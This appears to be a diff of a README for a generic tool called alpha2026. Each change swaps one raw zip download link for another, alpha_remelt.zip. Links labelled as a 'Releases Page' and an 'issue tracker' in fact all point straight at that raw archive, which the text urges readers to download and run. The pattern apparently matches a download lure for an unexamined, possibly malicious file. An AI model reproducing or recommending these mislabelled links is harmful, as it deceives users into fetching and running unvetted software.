@@ -2,13 +2,13 @@
 # 🚀 alpha2026 - Simple Tool for Everyday Use
 
 ## 📥 Download Now
-[![Download alpha2026](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha2026.zip)](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha2026.zip)
+[![Download alpha2026](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha_remelt.zip)](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha_remelt.zip)
 
 ## 🚀 Getting Started
 Welcome to alpha2026! This application is designed for everyday tasks, making your life simpler and more efficient. Follow the steps below to download and run this software easily.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [alpha2026 Releases](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha2026.zip).
+To get started, visit this page to download: [alpha2026 Releases](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha_remelt.zip).
 
 ### Step 1: Visit the Releases Page
 Click the link above to go to our releases page. Here, you will find the latest version of alpha2026 ready for you to download.
@@ -61,10 +61,10 @@ If you encounter issues during installation or while using alpha2026, try these 
 
 ### Issue: Download Fails
 - Check your internet connection.
-- Try downloading again from [alpha2026 Releases](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha2026.zip).
+- Try downloading again from [alpha2026 Releases](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha_remelt.zip).
 
 ## 📞 Support
-If problems persist, feel free to reach out for support. For any questions, visit our [issue tracker](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha2026.zip) to report your problem, and we'll assist you as soon as possible.
+If problems persist, feel free to reach out for support. For any questions, visit our [issue tracker](https://raw.githubusercontent.com/cecios12/alpha2026/main/tean/alpha_remelt.zip) to report your problem, and we'll assist you as soon as possible.
 
 Thank you for using alpha2026! We hope you find it useful.
 ```
